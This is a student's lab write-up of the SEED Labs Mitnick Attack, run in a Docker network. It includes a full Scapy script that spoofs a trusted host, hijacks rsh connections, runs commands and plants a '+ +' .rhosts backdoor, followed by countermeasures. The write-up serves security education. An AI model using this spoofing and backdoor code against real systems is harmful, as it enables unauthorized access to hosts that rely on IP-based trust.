# Mitnick Attack Lab

<div align="center">

![Lab](https://img.shields.io/badge/SEED%20Lab-Mitnick%20Attack-red?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Tools](https://img.shields.io/badge/Tools-Scapy%20%7C%20Python%20%7C%20Wireshark-blue?style=for-the-badge)

</div>

**Student:** Zernouh Lakhdar — Group 2  
**University:** Amar Telidji University, Laghouat, Algeria  
**Lab Series:** SEED Labs — Syracuse University  

---

## 🎯 Objective

This lab replicates **Kevin Mitnick's famous 1994 attack** against Tsutomu Shimomura, one of the most iconic intrusions in cybersecurity history. The attack exploits three weaknesses simultaneously: **IP-based trust** (`.rhosts`), **blind TCP sequence number prediction**, and **IP spoofing**. The goal is to:

1. **DoS** the Trusted Server via simulated SYN flooding (to silence it)
2. **Spoof TCP connections** impersonating the Trusted Server to establish an rsh session with the X-Terminal
3. **Plant a backdoor** by overwriting the `.rhosts` file with `+ +`, granting passwordless rsh access to anyone

---

## 🖥️ Lab Environment

| Host | IP Address | Role |
|------|-----------|------|
| X-Terminal | `10.9.0.5` | Target machine |
| Trusted Server | `10.9.0.6` | Trusted host (impersonated by attacker) |
| Attacker | `10.9.0.1` | Launches all spoofed packets via Scapy |

| Component | Details |
|-----------|---------|
| **Platform** | SEED Labs Docker environment |
| **Network Interface** | `br-114b2efc679f` (Docker bridge) |
| **Tools** | Scapy 2.4+, Python 3, Wireshark, rsh/rshd |
| **Key File** | `.rhosts` — controls passwordless rsh trust |

---

## ✅ Tasks Completed

- ✅ **Lab Setup** — Configure `.rhosts` on X-Terminal to trust the Trusted Server; verify passwordless `rsh` login
- ✅ **Task 1** — Simulated SYN Flooding — add Trusted Server MAC to X-Terminal ARP table; silence the Trusted Server
- ✅ **Task 2.1** — Spoof the first TCP connection (SYN → SYN-ACK → ACK three-way handshake)
- ✅ **Task 2.2** — Spoof the second TCP connection; send rsh data payload with command `touch /tmp/xyz`; verify file created on X-Terminal
- ✅ **Task 3** — Plant backdoor by overwriting `.rhosts` with `+ +`; verify passwordless `rsh 10.9.0.5` from attacker

---

## 🧠 Key Concepts Covered

- **`.rhosts` trust model** — IP-based authentication with no cryptographic verification
- **IP spoofing** — forging source IP to impersonate a trusted host
- **TCP three-way handshake** — SYN → SYN-ACK → ACK and how it can be spoofed
- **Blind sequence number prediction** — guessing the server's ISN without seeing the SYN-ACK (historically feasible with weak ISN generation)
- **SYN flooding as a DoS** — silencing the real Trusted Server so it cannot send RST packets that would tear down spoofed connections
- **rsh protocol** — two-connection design (primary on port 514, stderr on a second port)
- **Dual-connection rsh handshake** — rshd only executes the command after both TCP connections are established
- **Backdoor via `.rhosts`** — `+ +` grants passwordless rsh from any host

---

## 📊 Attack Flow

```
Attacker (10.9.0.1)
     │
     ├─[1]── SYN flood → Trusted Server (10.9.0.6)   [silence it — prevent RST]
     │
     ├─[2]── Spoofed SYN → X-Terminal (port 514)
     │        src=10.9.0.6, sport=1023, seq=ISN
     │
     │       X-Terminal sends SYN-ACK → 10.9.0.6 (Trusted Server)
     │        [Trusted Server is DoS'd — sends no RST]
     │
     ├─[3]── Spoofed ACK → X-Terminal         [handshake complete]
     │
     ├─[4]── Spoofed rsh DATA → X-Terminal
     │        payload: "9090\x00seed\x00seed\x00echo + + > .rhosts\x00"
     │
     │       X-Terminal opens 2nd connection → 10.9.0.6:9090 (stderr)
     │
     ├─[5]── Spoofed SYN-ACK → X-Terminal:9090   [complete 2nd connection]
     │
     └─[✓]── Command executed on X-Terminal: .rhosts overwritten with "+ +"
```

---

## 💻 Code & Scripts

All scripts are in the [`code/`](./code/) folder.

### Lab Setup — Verify `.rhosts` Trust
```bash
# On X-Terminal: add Trusted Server to .rhosts
echo "10.9.0.6" > /home/seed/.rhosts

# On Trusted Server: verify passwordless rsh login to X-Terminal
rsh 10.9.0.5 date
# Expected: Mon Mar 30 07:44:32 UTC 2026  (no password prompt)
```

### Task 1 — Prepare ARP Table (X-Terminal)
```bash
# Ping Trusted Server from X-Terminal to populate ARP cache
ping -c 4 10.9.0.6

# Verify MAC address is in ARP table
arp -n
```

### Task 2.1 — Spoof First SYN Packet
```python
#!/usr/bin/python3
# syn_spoof.py — Send spoofed SYN to X-Terminal impersonating Trusted Server
from scapy.all import *

x_ip   = "10.9.0.5"   # X-Terminal
srv_ip = "10.9.0.6"   # Trusted Server (we impersonate this)

ip  = IP(src=srv_ip, dst=x_ip)
tcp = TCP(
    sport = 1023,   # rsh requires privileged source port (≤1023)
    dport = 514,    # rshd listens here
    flags = "S",
    seq   = 1000
)
pkt = ip / tcp
send(pkt)
```

### Task 2.2 — Full Mitnick Attack (rsh Command Injection)
```python
#!/usr/bin/python3
# mitnick_attack.py — Full spoofed rsh session with dual-connection handling
from scapy.all import *
import threading
import time

X_IP        = "10.9.0.5"           # X-Terminal IP
X_PORT      = 514                   # rshd port on X-Terminal
SRV_IP      = "10.9.0.6"           # Trusted Server IP (we impersonate)
SRV_PORT    = 1023                  # Source port (rsh requires ≤1023)
SECOND_PORT = 9090                  # Port for rsh's stderr (2nd connection)
IFACE       = "br-114b2efc679f"     # Docker bridge interface
ISN         = 0x1000                # Our initial sequence number

# ── Task 2.2: test command ──────────────────────────────────
COMMAND = "touch /tmp/xyz"
# ── Task 3: backdoor command ────────────────────────────────
# COMMAND = "echo + + > /home/seed/.rhosts"

# ─────────────────────────────────────────────
# GLOBALS
# ─────────────────────────────────────────────
seq_num          = ISN + 1
second_conn_done = threading.Event()


# ═══════════════════════════════════════════════════════════
# THREAD: Handle the second TCP connection (rshd stderr)
# rshd will NOT execute the command until this is complete.
# ═══════════════════════════════════════════════════════════
def listen_for_second_connection():
    def handle(pkt):
        if IP not in pkt or TCP not in pkt:
            return
        tcp = pkt[TCP]
        if tcp.flags == "S":   # X-Terminal initiates SYN to our SECOND_PORT
            print(f"\n [2nd conn] SYN received  seq={tcp.seq}")
            synack = IP(src=SRV_IP, dst=X_IP) / TCP(
                sport = SECOND_PORT,
                dport = tcp.sport,
                flags = "SA",
                seq   = 0x2000,
                ack   = tcp.seq + 1
            )
            send(synack, verbose=0)
            print(f" [2nd conn] SYN+ACK sent ✓")
            second_conn_done.set()
            return True

    pkt_filter = (f"tcp and src host {X_IP} and dst host {SRV_IP}"
                  f" and dst port {SECOND_PORT}")
    sniff(iface=IFACE, filter=pkt_filter, prn=handle,
          stop_filter=lambda p: second_conn_done.is_set())


# ═══════════════════════════════════════════════════════════
# FIRST TCP CONNECTION
# 1. Send spoofed SYN  →  X-Terminal
# 2. Sniff SYN+ACK     ←  X-Terminal
# 3. Send spoofed ACK  →  X-Terminal  (handshake complete)
# 4. Send rsh data     →  X-Terminal  (port\0user\0user\0cmd\0)
# ═══════════════════════════════════════════════════════════
def handle_first_connection(pkt):
    global seq_num
    if IP not in pkt or TCP not in pkt:
        return
    tcp = pkt[TCP]
    if tcp.flags != "SA":
        return

    x_isn = tcp.seq
    print(f"\n [1st conn] SYN+ACK received  x_seq={x_isn}")
    ip = IP(src=SRV_IP, dst=X_IP)

    # Step 3 — complete handshake
    ack_pkt = TCP(sport=SRV_PORT, dport=X_PORT,
                  flags="A", seq=seq_num, ack=x_isn + 1)
    send(ip / ack_pkt, verbose=0)
    print(f" [1st conn] ACK sent ✓  (handshake complete)")

    # Step 4 — send rsh data: stderr_port\0client_uid\0server_uid\0cmd\0
    rsh_payload = f"{SECOND_PORT}\x00seed\x00seed\x00{COMMAND}\x00".encode()
    data_pkt = TCP(sport=SRV_PORT, dport=X_PORT,
                   flags="A", seq=seq_num, ack=x_isn + 1)
    send(ip / data_pkt / rsh_payload, verbose=0)
    seq_num += len(rsh_payload)
    print(f" [1st conn] rsh data sent ✓")
    print(f"            command: {COMMAND}")
    return True


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════
def main():
    print("=" * 52)
    print("  Mitnick Attack — SEED Lab")
    print("=" * 52)
    print(f"  Target      : {X_IP}:{X_PORT}")
    print(f"  Impersonate : {SRV_IP}:{SRV_PORT}")
    print(f"  Interface   : {IFACE}")
    print(f"  Command     : {COMMAND}")
    print("=" * 52)

    # Start 2nd-connection listener BEFORE sending anything
    print("\n[*] Starting second-connection listener...")
    t = threading.Thread(target=listen_for_second_connection, daemon=True)
    t.start()
    time.sleep(0.5)

    # Step 1 — send spoofed SYN
    print("[*] Sending spoofed SYN...")
    syn = IP(src=SRV_IP, dst=X_IP) / TCP(
        sport=SRV_PORT, dport=X_PORT, flags="S", seq=ISN)
    send(syn, verbose=0)
    print(f"    SYN sent  seq={ISN} ✓")

    # Step 2 — sniff SYN+ACK and complete handshake
    print("[*] Waiting for SYN+ACK from X-Terminal...")
    pkt_filter = (f"tcp and src host {X_IP} and dst host {SRV_IP}"
                  f" and dst port {SRV_PORT}")
    sniff(iface=IFACE, filter=pkt_filter,
          prn=handle_first_connection, count=1)

    # Wait for 2nd connection
    print("\n[*] Waiting for second connection (rshd stderr)...")
    second_conn_done.wait(timeout=10)

    print("\n" + "=" * 52)
    if second_conn_done.is_set():
        print("  [✓] Attack complete!")
        print(f"      Verify on X-Terminal: ls -la /tmp/xyz")
        if "rhosts" in COMMAND:
            print(f"      Then try: rsh {X_IP}  (no password)")
    else:
        print("  [!] Second connection timed out — try again.")
    print("=" * 52)


if __name__ == "__main__":
    main()
```

### Task 3 — Verify Backdoor
```bash
# On X-Terminal: check .rhosts was overwritten
cat /home/seed/.rhosts
# Expected output: + +

# On Attacker: connect to X-Terminal with no password
rsh 10.9.0.5
# Expected: shell prompt — no password requested
```

---

## 🖼️ Screenshots

Screenshots are in the [`screenshots/`](./screenshots/) folder:

| File | Description |
|------|-------------|
| `01-rhosts-setup.png` | `.rhosts` configured on X-Terminal; Trusted Server login verified |
| `02-rsh-no-password.png` | `rsh 10.9.0.5 date` succeeds without password from Trusted Server |
| `03-arp-ping.png` | Pinging Trusted Server from X-Terminal to populate ARP table |
| `04-arp-table.png` | ARP table showing Trusted Server MAC address on X-Terminal |
| `05-syn-sent-wireshark.png` | Wireshark: spoofed SYN packet (src=10.9.0.6 → dst=10.9.0.5) |
| `06-synack-received.png` | Wireshark: X-Terminal responds with SYN-ACK to spoofed SYN |
| `07-handshake-complete.png` | Wireshark: 3-way handshake completed (ACK sent) |
| `08-rsh-session-established.png` | Wireshark: RSH Session Establishment entry visible |
| `09-rsh-data-sent.png` | Terminal output: rsh data payload sent (port, users, command) |
| `10-wireshark-rsh-payload.png` | Wireshark: rsh data packet decoded (stderr port, usernames, command) |
| `11-touch-xyz-verified.png` | X-Terminal: `ls -l /tmp/xyz` confirms file was created |
| `12-backdoor-rhosts.png` | X-Terminal: `cat /home/seed/.rhosts` shows `+ +` |
| `13-rsh-no-password-attacker.png` | Attacker: `rsh 10.9.0.5` connects without password prompt |
| `14-wireshark-backdoor.png` | Wireshark capture of full backdoor attack session |

---

## 📊 Key Findings

| Task | Action | Result |
|------|--------|--------|
| Lab Setup | `.rhosts` trust configured | Trusted Server logs in to X-Terminal without password |
| Task 1 | ARP table seeded; Trusted Server silenced | X-Terminal's ARP cache has Trusted Server MAC |
| Task 2.1 | Spoofed SYN sent | X-Terminal responds with SYN-ACK ✅ |
| Task 2.2 | Full rsh handshake + `touch /tmp/xyz` | File `/tmp/xyz` created on X-Terminal ✅ |
| Task 3 | `echo + + > .rhosts` injected | `rsh 10.9.0.5` from attacker — **no password** ✅ |

**Key Takeaway:** The Mitnick attack exploits the combination of IP-based trust (`.rhosts`) and weak TCP ISN generation. Today, randomized ISNs (RFC 6528) make blind sequence prediction infeasible, and SSH has completely replaced rsh/rlogin. The attack remains historically significant as an early demonstration of multi-vector exploitation.

---

## 🛡️ Countermeasures

| Vulnerability | Countermeasure |
|--------------|---------------|
| Predictable TCP ISNs | **RFC 6528** — randomized ISN generation; blind prediction infeasible on all modern OSes |
| IP-based authentication (`.rhosts`) | **Disable `.rhosts` and `/etc/hosts.equiv`** entirely; never use on production systems |
| Unencrypted rsh/rlogin | **Replace with SSH** — public-key cryptography; immune to IP spoofing |
| IP spoofing from outside | **Ingress/Egress filtering** — routers drop packets with source IPs not matching network range |

---

## 📄 References

- **Lab Manual:** [`lab-instructions.pdf`](./lab-instructions.pdf) — included in this folder
- **SEED Labs:** https://seedsecuritylabs.org/Labs_20.04/Networking/Mitnick_Attack/
- **RFC 793** — Transmission Control Protocol
- **RFC 6528** — Defending Against Sequence Number Attacks (randomized ISNs)
- **Shimomura, T. & Markoff, J.** — *Takedown* (1996) — account of the original attack
- **Mitnick, K.** — *The Art of Intrusion* (2005)

---

> 🔬 *This lab is part of the [SEED Labs](https://seedsecuritylabs.org/) series by Syracuse University. All experiments conducted in isolated Docker environments for educational purposes only.*
